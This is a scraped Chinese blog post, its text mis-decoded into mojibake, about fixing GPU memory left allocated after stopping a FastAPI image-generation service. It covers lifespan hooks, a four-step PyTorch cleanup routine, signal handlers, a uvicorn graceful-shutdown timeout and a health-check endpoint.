.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5def41376f0e436db16d2e868d7ff77e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9tb2NvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936582&amp;x-signature=EYRWW%2FL7NILBEcVYZZ%2Baoc%2BcMuU%3D" alt="ScreenShot_2025-12-10_095136_976.jpg" loading="lazy"/></p>
<blockquote>
<p>èŠèŠ AI åç«¯é‚£äº›äº‹å„¿ Â· ç¬¬ 1 ç¯‡ | é¢„ä¼°é˜…è¯»ï¼š10 åˆ†é’Ÿ</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">å‘ç°æ˜¾å­˜æ³„æ¼ - ã€Œæˆ‘æœ‰ä¸ªæœ‹å‹ã€ç³»åˆ—</h2>
<p>æˆ‘æœ‰ä¸ªæœ‹å‹å«å°ç¦¾ï¼Œå‰äº›å¤©ï¼Œå°ç¦¾è¸©äº†ä¸å°‘å‰ç«¯çš„å‘ã€‚è¿™å‡ å¤©ï¼Œå°ç¦¾å¼€å§‹å¯¹ä»˜åç«¯ã€‚</p>
<p>åç«¯ç”¨çš„æ˜¯ FastAPIï¼Œè·‘åœ¨ä¸€å°æœ‰ 24G æ˜¾å­˜çš„ GPU æœåŠ¡å™¨ä¸Šã€‚æœ¬åœ°å¼€å‘ä¸€åˆ‡æ­£å¸¸ï¼Œéƒ¨ç½²ä¸Šå»ä¹Ÿæ²¡é—®é¢˜ã€‚</p>
<p>ç›´åˆ°æœ‰ä¸€å¤©ï¼Œå°ç¦¾åœ¨æœåŠ¡å™¨ä¸ŠæŒ‰äº† Ctrl+C åœæ‰æœåŠ¡ï¼Œå‡†å¤‡æ›´æ–°ä»£ç ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœæ­¢æœåŠ¡</span>
^C
INFO: Shutting down...

<span class="hljs-comment"># é‡æ–°å¯åŠ¨</span>
$ python run.py
</code></pre>
<p>ç„¶åï¼ŒæœåŠ¡å°±å´©äº†ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">torch.cuda.OutOfMemoryError: CUDA <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> memory.
Tried <span class="hljs-keyword">to</span> <span class="hljs-keyword">allocate</span> <span class="hljs-number">2.00</span> GiB (GPU <span class="hljs-number">0</span>; <span class="hljs-number">24.00</span> GiB total capacity;
<span class="hljs-number">22.10</span> GiB already allocated; <span class="hljs-number">1.43</span> GiB <span class="hljs-keyword">free</span>)
</code></pre>
<p>å°ç¦¾æ‡µäº†ï¼šæˆ‘æ˜æ˜åœæ‰æœåŠ¡äº†ï¼Œä¸ºä»€ä¹ˆæ˜¾å­˜è¿˜è¢«å ç€ï¼Ÿ</p>
<p>ä»–æ‰“å¼€ nvidia-smi ä¸€çœ‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ nvidia-smi
+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|=============================================================================|
|    0   N/A  N/A     12345      C   python                          10240MiB |
+-----------------------------------------------------------------------------+
</code></pre>
<p>è¿›ç¨‹è¿˜åœ¨ï¼</p>
<p>åŸæ¥ Ctrl+C è™½ç„¶åœäº† uvicornï¼Œä½† Python è¿›ç¨‹æ²¡æœ‰å®Œå…¨é€€å‡ºï¼Œæ¨¡å‹è¿˜åœ¨æ˜¾å­˜é‡Œèººç€ã€‚</p>
<p>å°ç¦¾åªå¥½ <code>kill -9</code> å¼ºåˆ¶æ€æ‰è¿›ç¨‹ï¼Œç„¶åé‡æ–°å¯åŠ¨ã€‚</p>
<p>"è¿™ä¹Ÿå¤ªè ¢äº†å§ï¼Œæ¯æ¬¡é‡å¯éƒ½è¦æ‰‹åŠ¨æ€è¿›ç¨‹ï¼Ÿ"</p>
<hr/>
<h2 data-id="heading-1">FastAPI çš„ç”Ÿå‘½å‘¨æœŸ</h2>
<p>å°ç¦¾æŸ¥äº†æŸ¥æ–‡æ¡£ï¼Œå‘ç° FastAPI æœ‰ä¸€å¥—ç”Ÿå‘½å‘¨æœŸç®¡ç†æœºåˆ¶ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[åº”ç”¨å¯åŠ¨]
    B[startup äº‹ä»¶]
    C[åŠ è½½ AI æ¨¡å‹&lt;br/&gt;åˆå§‹åŒ–æ•°æ®åº“è¿æ¥&lt;br/&gt;é¢„çƒ­ç¼“å­˜]
    D[å¤„ç†è¯·æ±‚...]
    E[shutdown äº‹ä»¶]
    F[é‡Šæ”¾ AI æ¨¡å‹&lt;br/&gt;å…³é—­æ•°æ®åº“è¿æ¥&lt;br/&gt;æ¸…ç†ä¸´æ—¶æ–‡ä»¶]
    G[åº”ç”¨å…³é—­]

    A --&gt; B
    B --&gt; C
    C --&gt; D
    D --&gt; E
    E --&gt; F
    F --&gt; G
</code></pre>
<p>åŸæ¥ FastAPI æä¾›äº† <code>startup</code> å’Œ <code>shutdown</code> ä¸¤ä¸ªäº‹ä»¶é’©å­ï¼Œå¯ä»¥åœ¨åº”ç”¨å¯åŠ¨å’Œå…³é—­æ—¶æ‰§è¡Œç‰¹å®šé€»è¾‘ã€‚</p>
<p>å°ç¦¾ä¹‹å‰åªå†™äº†åŠ è½½æ¨¡å‹çš„ä»£ç ï¼Œä½†ä»æ¥æ²¡å†™è¿‡é‡Šæ”¾æ¨¡å‹çš„ä»£ç ã€‚</p>
<p>éš¾æ€ªæ˜¾å­˜ä¸é‡Šæ”¾â€”â€”æ ¹æœ¬æ²¡äººå‘Šè¯‰ç¨‹åºè¦é‡Šæ”¾ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸¤ç§å†™æ³•</h2>
<p>FastAPI æ”¯æŒä¸¤ç§ç”Ÿå‘½å‘¨æœŸç®¡ç†æ–¹å¼ã€‚</p>
<p><strong>å†™æ³•ä¸€ï¼šè£…é¥°å™¨æ–¹å¼ï¼ˆä¼ ç»Ÿå†™æ³•ï¼‰</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

app = FastAPI()

<span class="hljs-meta">@app.on_event(<span class="hljs-params"><span class="hljs-string">"startup"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">startup_event</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åº”ç”¨å¯åŠ¨"</span>)
    <span class="hljs-comment"># åŠ è½½æ¨¡å‹</span>

<span class="hljs-meta">@app.on_event(<span class="hljs-params"><span class="hljs-string">"shutdown"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">shutdown_event</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åº”ç”¨å…³é—­"</span>)
    <span class="hljs-comment"># é‡Šæ”¾æ¨¡å‹</span>
</code></pre>
<p><strong>å†™æ³•äºŒï¼šlifespan ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼ˆæ¨èï¼ŒFastAPI 0.93+ï¼‰</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> asynccontextmanager
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

<span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    <span class="hljs-comment"># å¯åŠ¨æ—¶æ‰§è¡Œ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åº”ç”¨å¯åŠ¨"</span>)
    <span class="hljs-keyword">yield</span>
    <span class="hljs-comment"># å…³é—­æ—¶æ‰§è¡Œ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åº”ç”¨å…³é—­"</span>)

app = FastAPI(lifespan=lifespan)
</code></pre>
<p>å°ç¦¾é€‰äº†ç¬¬äºŒç§å†™æ³•ï¼Œå› ä¸ºå®ƒæ›´æ¸…æ™°â€”â€”å¯åŠ¨å’Œå…³é—­çš„é€»è¾‘å†™åœ¨ä¸€èµ·ï¼Œä¸€çœ¼å°±èƒ½çœ‹å‡ºé…å¯¹å…³ç³»ã€‚</p>
<hr/>
<h2 data-id="heading-3">å®Œæ•´çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†</h2>
<p>å°ç¦¾å¼€å§‹é‡æ„ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># app/main.py</span>
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> asynccontextmanager
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI
<span class="hljs-keyword">from</span> app.services.model_manager <span class="hljs-keyword">import</span> ModelManager
<span class="hljs-keyword">from</span> app.core.config <span class="hljs-keyword">import</span> settings
<span class="hljs-keyword">from</span> app.core.logger <span class="hljs-keyword">import</span> logger

<span class="hljs-comment"># å…¨å±€æ¨¡å‹ç®¡ç†å™¨</span>
model_manager = ModelManager()

<span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    <span class="hljs-string">"""åº”ç”¨ç”Ÿå‘½å‘¨æœŸç®¡ç†"""</span>

    <span class="hljs-comment"># ===== å¯åŠ¨é˜¶æ®µ =====</span>
    logger.info(<span class="hljs-string">f"æ­£åœ¨å¯åŠ¨ <span class="hljs-subst">{settings.PROJECT_NAME}</span>"</span>)
    logger.info(<span class="hljs-string">f"è¿è¡Œç¯å¢ƒ: <span class="hljs-subst">{settings.ENVIRONMENT}</span>"</span>)
    logger.info(<span class="hljs-string">f"è®¾å¤‡: <span class="hljs-subst">{settings.DEVICE}</span>"</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># åŠ è½½ AI æ¨¡å‹</span>
        model_manager.load_model()
        logger.info(<span class="hljs-string">f"æ¨¡å‹ (<span class="hljs-subst">{settings.IMAGE_MODEL}</span>) åŠ è½½å®Œæˆ"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"å¯åŠ¨å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
        <span class="hljs-keyword">raise</span>  <span class="hljs-comment"># å¯åŠ¨å¤±è´¥è¦æŠ›å‡ºå¼‚å¸¸ï¼Œé˜»æ­¢æœåŠ¡å¯åŠ¨</span>

    <span class="hljs-comment"># ===== è¿è¡Œé˜¶æ®µ =====</span>
    <span class="hljs-keyword">yield</span>  <span class="hljs-comment"># æœåŠ¡è¿è¡Œä¸­...</span>

    <span class="hljs-comment"># ===== å…³é—­é˜¶æ®µ =====</span>
    logger.info(<span class="hljs-string">"æ­£åœ¨å…³é—­æœåŠ¡..."</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># é‡Šæ”¾æ¨¡å‹èµ„æº</span>
        model_manager.cleanup()
        logger.info(<span class="hljs-string">"æ¨¡å‹èµ„æºå·²é‡Šæ”¾"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"æ¸…ç†æ—¶å‡ºé”™: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)

    logger.info(<span class="hljs-string">"æœåŠ¡å·²å…³é—­"</span>)

app = FastAPI(
    title=settings.PROJECT_NAME,
    lifespan=lifespan
)
</code></pre>
<p>å…³é”®åœ¨äº <code>cleanup()</code> æ–¹æ³•ï¼Œå®ƒè´Ÿè´£é‡Šæ”¾ GPU æ˜¾å­˜ã€‚</p>
<hr/>
<h2 data-id="heading-4">æ¨¡å‹æ¸…ç†çš„æ­£ç¡®å§¿åŠ¿</h2>
<p>å°ç¦¾æœ€åˆå†™çš„æ¸…ç†æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):
    <span class="hljs-keyword">del</span> self.model
    self.model = <span class="hljs-literal">None</span>
</code></pre>
<p>ç»“æœå‘ç°ï¼šæ˜¾å­˜è¿˜æ˜¯æ²¡é‡Šæ”¾ã€‚</p>
<p>åŸæ¥ PyTorch çš„æ˜¾å­˜ç®¡ç†æ¯”è¾ƒç‰¹æ®Šï¼Œå•çº¯ <code>del</code> æ˜¯ä¸å¤Ÿçš„ã€‚å°ç¦¾æŸ¥äº†èµ„æ–™ï¼Œæ‰¾åˆ°äº†æ­£ç¡®çš„æ¸…ç†æµç¨‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># app/services/model_manager.py</span>
<span class="hljs-keyword">import</span> gc
<span class="hljs-keyword">import</span> torch

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelManager</span>:
    <span class="hljs-string">"""æ¨¡å‹ç®¡ç†å™¨"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.pipe = <span class="hljs-literal">None</span>
        self.device = settings.DEVICE

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_model</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åŠ è½½æ¨¡å‹åˆ° GPU"""</span>
        <span class="hljs-keyword">if</span> self.pipe <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>  <span class="hljs-comment"># å·²åŠ è½½ï¼Œä¸é‡å¤åŠ è½½</span>

        logger.info(<span class="hljs-string">"æ­£åœ¨åŠ è½½æ¨¡å‹..."</span>)
        self.pipe = StableDiffusionXLPipeline.from_pretrained(
            settings.MODEL_PATH,
            torch_dtype=torch.float16,
        ).to(self.device)
        logger.info(<span class="hljs-string">"æ¨¡å‹åŠ è½½å®Œæˆ"</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""é‡Šæ”¾æ¨¡å‹èµ„æº"""</span>
        <span class="hljs-keyword">if</span> self.pipe <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>

        logger.info(<span class="hljs-string">"æ­£åœ¨é‡Šæ”¾æ¨¡å‹èµ„æº..."</span>)

        <span class="hljs-comment"># ç¬¬ä¸€æ­¥ï¼šæŠŠæ¨¡å‹ä» GPU ç§»åˆ° CPU</span>
        self.pipe.to(<span class="hljs-string">"cpu"</span>)

        <span class="hljs-comment"># ç¬¬äºŒæ­¥ï¼šåˆ é™¤å¼•ç”¨</span>
        <span class="hljs-keyword">del</span> self.pipe
        self.pipe = <span class="hljs-literal">None</span>

        <span class="hljs-comment"># ç¬¬ä¸‰æ­¥ï¼šå¼ºåˆ¶åƒåœ¾å›æ”¶</span>
        gc.collect()

        <span class="hljs-comment"># ç¬¬å››æ­¥ï¼šæ¸…ç† CUDA ç¼“å­˜</span>
        <span class="hljs-keyword">if</span> torch.cuda.is_available():
            torch.cuda.empty_cache()
            torch.cuda.synchronize()  <span class="hljs-comment"># ç­‰å¾… GPU æ“ä½œå®Œæˆ</span>

        logger.info(<span class="hljs-string">"æ¨¡å‹èµ„æºå·²é‡Šæ”¾"</span>)
</code></pre>
<p>å››æ­¥ç¼ºä¸€ä¸å¯ï¼š</p>
<ol>
<li><strong>ç§»åˆ° CPU</strong>ï¼šå…ˆæŠŠå¼ é‡ä» GPU æ¬èµ°</li>
<li><strong>åˆ é™¤å¼•ç”¨</strong>ï¼šè§£é™¤ Python å¯¹è±¡çš„å¼•ç”¨</li>
<li><strong>åƒåœ¾å›æ”¶</strong>ï¼šè§¦å‘ Python çš„ GC</li>
<li><strong>æ¸…ç†ç¼“å­˜</strong>ï¼šå‘Šè¯‰ CUDA é‡Šæ”¾å·²åˆ†é…ä½†æœªä½¿ç”¨çš„æ˜¾å­˜</li>
</ol>
<p>å°ç¦¾æµ‹è¯•äº†ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨å‰</span>
$ nvidia-smi
GPU Memory: 2GB / 24GB

<span class="hljs-comment"># æœåŠ¡è¿è¡Œä¸­</span>
$ nvidia-smi
GPU Memory: 12GB / 24GB

<span class="hljs-comment"># Ctrl+C åœæ­¢æœåŠ¡</span>
$ nvidia-smi
GPU Memory: 2GB / 24GB  <span class="hljs-comment"># é‡Šæ”¾äº†ï¼</span>
</code></pre>
<p>ç»ˆäºæ­£å¸¸äº†ã€‚</p>
<hr/>
<h2 data-id="heading-5">ä½†æ˜¯ï¼ŒCtrl+C æœ‰æ—¶å€™ä¸ç®¡ç”¨</h2>
<p>å°ç¦¾é«˜å…´äº†æ²¡ä¸¤å¤©ï¼Œé—®é¢˜åˆæ¥äº†ã€‚</p>
<p>æœ‰æ—¶å€™ç”¨ Ctrl+C åœæ­¢æœåŠ¡ï¼Œ<code>shutdown</code> äº‹ä»¶æ ¹æœ¬æ²¡è§¦å‘ï¼Œæ˜¾å­˜è¿˜æ˜¯è¢«å ç€ã€‚</p>
<p>ä»–ç ”ç©¶äº†ä¸€ä¸‹ï¼Œå‘ç°é—®é¢˜å‡ºåœ¨ä¿¡å·å¤„ç†ä¸Šã€‚</p>
<p>å½“ä½ æŒ‰ Ctrl+C æ—¶ï¼Œç³»ç»Ÿå‘é€çš„æ˜¯ <code>SIGINT</code> ä¿¡å·ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œuvicorn ä¼šæ•è·è¿™ä¸ªä¿¡å·ï¼Œä¼˜é›…åœ°å…³é—­æœåŠ¡ã€‚</p>
<p>ä½†å¦‚æœç¨‹åºåœ¨æ‰§è¡ŒæŸäº›é˜»å¡æ“ä½œï¼ˆæ¯”å¦‚ AI æ¨ç†ï¼‰ï¼Œå¯èƒ½æ¥ä¸åŠå¤„ç†ä¿¡å·å°±è¢«å¼ºåˆ¶ç»ˆæ­¢äº†ã€‚</p>
<p>æ›´ç³Ÿç³•çš„æ˜¯ <code>kill -9</code>ï¼Œå®ƒå‘é€çš„æ˜¯ <code>SIGKILL</code> ä¿¡å·ï¼Œæ ¹æœ¬ä¸ç»™ç¨‹åºä»»ä½•æ¸…ç†çš„æœºä¼šã€‚</p>
<p>å°ç¦¾çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼š<strong>æ³¨å†Œä¿¡å·å¤„ç†å™¨</strong>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">def</span> <span class="hljs-title function_">signal_handler</span>(<span class="hljs-params">signum, frame</span>):
    <span class="hljs-string">"""å¤„ç†ç»ˆæ­¢ä¿¡å·"""</span>
    logger.info(<span class="hljs-string">f"æ”¶åˆ°ä¿¡å· <span class="hljs-subst">{signum}</span>ï¼Œå‡†å¤‡æ¸…ç†..."</span>)

    <span class="hljs-keyword">try</span>:
        model_manager.cleanup()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"æ¸…ç†å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)

    sys.exit(<span class="hljs-number">0</span>)

<span class="hljs-comment"># æ³¨å†Œä¿¡å·å¤„ç†å™¨</span>
signal.signal(signal.SIGINT, signal_handler)   <span class="hljs-comment"># Ctrl+C</span>
signal.signal(signal.SIGTERM, signal_handler)  <span class="hljs-comment"># kill å‘½ä»¤</span>
</code></pre>
<p>è¿™æ ·å³ä½¿ FastAPI çš„ <code>shutdown</code> äº‹ä»¶æ²¡è§¦å‘ï¼Œä¿¡å·å¤„ç†å™¨ä¹Ÿèƒ½å…œåº•ã€‚</p>
<hr/>
<h2 data-id="heading-6">Uvicorn çš„ä¼˜é›…å…³é—­é…ç½®</h2>
<p>å°ç¦¾è¿˜å‘ç° uvicorn æœ‰ä¸ªé…ç½®é¡¹å¯ä»¥æ§åˆ¶ä¼˜é›…å…³é—­çš„è¶…æ—¶æ—¶é—´ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># run.py</span>
<span class="hljs-keyword">import</span> uvicorn

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    uvicorn.run(
        <span class="hljs-string">"app.main:app"</span>,
        host=<span class="hljs-string">"0.0.0.0"</span>,
        port=<span class="hljs-number">8000</span>,
        reload=<span class="hljs-literal">False</span>,  <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒä¸è¦å¼€ reload</span>
        workers=<span class="hljs-number">1</span>,     <span class="hljs-comment"># AI åº”ç”¨ä¸€èˆ¬å•è¿›ç¨‹</span>
        timeout_graceful_shutdown=<span class="hljs-number">30</span>,  <span class="hljs-comment"># ç»™ 30 ç§’æ¸…ç†æ—¶é—´</span>
    )
</code></pre>
<p><code>timeout_graceful_shutdown</code> å‚æ•°å‘Šè¯‰ uvicornï¼šæ”¶åˆ°åœæ­¢ä¿¡å·åï¼Œç­‰å¾…æœ€å¤š 30 ç§’è®©ç¨‹åºå®Œæˆæ¸…ç†å·¥ä½œã€‚å¦‚æœ 30 ç§’å†…æ²¡æ¸…ç†å®Œï¼Œæ‰å¼ºåˆ¶ç»ˆæ­¢ã€‚</p>
<hr/>
<h2 data-id="heading-7">è°ƒè¯•æŠ€å·§ï¼šç›‘æ§æ˜¾å­˜ä½¿ç”¨</h2>
<p>ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œå°ç¦¾å†™äº†ä¸ªæ˜¾å­˜ç›‘æ§å‡½æ•°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">log_gpu_memory</span>():
    <span class="hljs-string">"""æ‰“å°å½“å‰ GPU æ˜¾å­˜ä½¿ç”¨"""</span>
    <span class="hljs-keyword">if</span> torch.cuda.is_available():
        allocated = torch.cuda.memory_allocated() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>
        reserved = torch.cuda.memory_reserved() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>
        logger.info(<span class="hljs-string">f"GPU æ˜¾å­˜: å·²åˆ†é… <span class="hljs-subst">{allocated:<span class="hljs-number">.2</span>f}</span>GB, å·²é¢„ç•™ <span class="hljs-subst">{reserved:<span class="hljs-number">.2</span>f}</span>GB"</span>)
</code></pre>
<p>åœ¨å…³é”®ä½ç½®è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    log_gpu_memory()  <span class="hljs-comment"># å¯åŠ¨å‰</span>
    model_manager.load_model()
    log_gpu_memory()  <span class="hljs-comment"># åŠ è½½å</span>

    <span class="hljs-keyword">yield</span>

    log_gpu_memory()  <span class="hljs-comment"># æ¸…ç†å‰</span>
    model_manager.cleanup()
    log_gpu_memory()  <span class="hljs-comment"># æ¸…ç†å</span>
</code></pre>
<p>è¾“å‡ºç±»ä¼¼è¿™æ ·ï¼š</p>
<pre><code class="hljs language-erlang" lang="erlang">GPU æ˜¾å­˜: å·²åˆ†é… <span class="hljs-number">0.00</span>GB, å·²é¢„ç•™ <span class="hljs-number">0.00</span>GB
æ­£åœ¨åŠ è½½æ¨¡å‹...
æ¨¡å‹åŠ è½½å®Œæˆ
GPU æ˜¾å­˜: å·²åˆ†é… <span class="hljs-number">9.87</span>GB, å·²é¢„ç•™ <span class="hljs-number">10.12</span>GB
...
æ­£åœ¨é‡Šæ”¾æ¨¡å‹èµ„æº...
æ¨¡å‹èµ„æºå·²é‡Šæ”¾
GPU æ˜¾å­˜: å·²åˆ†é… <span class="hljs-number">0.00</span>GB, å·²é¢„ç•™ <span class="hljs-number">0.00</span>GB
</code></pre>
<p>ä¸€ç›®äº†ç„¶ã€‚</p>
<hr/>
<h2 data-id="heading-8">å¥åº·æ£€æŸ¥ç«¯ç‚¹</h2>
<p>å°ç¦¾è¿˜åŠ äº†ä¸ªå¥åº·æ£€æŸ¥ç«¯ç‚¹ï¼Œæ–¹ä¾¿è¿ç»´ç›‘æ§ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/health"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">health_check</span>():
    gpu_info = {}
    <span class="hljs-keyword">if</span> torch.cuda.is_available():
        gpu_info = {
            <span class="hljs-string">"allocated_gb"</span>: <span class="hljs-built_in">round</span>(torch.cuda.memory_allocated() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>, <span class="hljs-number">2</span>),
            <span class="hljs-string">"reserved_gb"</span>: <span class="hljs-built_in">round</span>(torch.cuda.memory_reserved() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>, <span class="hljs-number">2</span>),
        }

    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"healthy"</span>,
        <span class="hljs-string">"gpu"</span>: gpu_info,
        <span class="hljs-string">"model_loaded"</span>: model_manager.pipe <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>
    }
</code></pre>
<p>è¯·æ±‚ <code>/health</code> å°±èƒ½çœ‹åˆ°å½“å‰çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"healthy"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"gpu"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"allocated_gb"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9.87</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"reserved_gb"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10.12</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"model_loaded"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">ç”Ÿå‘½å‘¨æœŸæ¸…å•</h2>
<p>ç»è¿‡è¿™ç•ªæŠ˜è…¾ï¼Œå°ç¦¾æ€»ç»“äº†ä¸€ä»½æ¸…å•ï¼š</p>





















<table><thead><tr><th>é˜¶æ®µ</th><th>åŠ¨ä½œ</th></tr></thead><tbody><tr><td>startup</td><td>åŠ è½½æ¨¡å‹ã€åˆå§‹åŒ–è¿æ¥ã€é¢„çƒ­ç¼“å­˜</td></tr><tr><td>è¿è¡Œä¸­</td><td>å¤„ç†è¯·æ±‚ã€ç›‘æ§èµ„æº</td></tr><tr><td>shutdown</td><td>é‡Šæ”¾æ¨¡å‹ã€å…³é—­è¿æ¥ã€æ¸…ç†ç¼“å­˜</td></tr></tbody></table>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li>ä½¿ç”¨ <code>lifespan</code> ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œå¯åŠ¨å’Œå…³é—­é€»è¾‘é…å¯¹</li>
<li><code>cleanup()</code> è¦å½»åº•ï¼šç§»åˆ° CPUã€åˆ å¼•ç”¨ã€gcã€empty_cache</li>
<li>æ³¨å†Œä¿¡å·å¤„ç†å™¨åº”å¯¹å¼‚å¸¸å…³é—­</li>
<li>è®¾ç½® <code>timeout_graceful_shutdown</code> ç»™æ¸…ç†ç•™æ—¶é—´</li>
<li>æ·»åŠ å¥åº·æ£€æŸ¥ç«¯ç‚¹æ–¹ä¾¿ç›‘æ§</li>
</ol>
<hr/>
<h2 data-id="heading-10">å°ç¦¾çš„æ„Ÿæ‚Ÿ</h2>
<pre><code class="hljs language-bash" lang="bash">æ˜¾å­˜ä¸ä¼šè¯´è°ï¼Œ
ä¸é‡Šæ”¾å°±æ˜¯ä¸é‡Šæ”¾ã€‚

å¯åŠ¨æ—¶åŠ è½½ï¼Œ
å…³é—­æ—¶é‡Šæ”¾ï¼Œ
å¬èµ·æ¥å¾ˆç®€å•ï¼Œ
åšèµ·æ¥å…¨æ˜¯å‘ã€‚

del ä¸ç­‰äºé‡Šæ”¾ï¼Œ
Ctrl+C ä¸ç­‰äºå…³é—­ï¼Œ
<span class="hljs-built_in">kill</span> -9 æ›´æ˜¯ä¸è®²æ­¦å¾·ã€‚

lifespan æ˜¯æ•‘æ˜Ÿï¼Œ
ä¿¡å·å¤„ç†æ˜¯å…œåº•ï¼Œ
å››æ­¥æ¸…ç†è¦ç‰¢è®°ï¼š
ç§»åˆ° CPUã€åˆ å¼•ç”¨ã€gcã€empty_cacheã€‚

GPU å¾ˆè´µï¼Œ
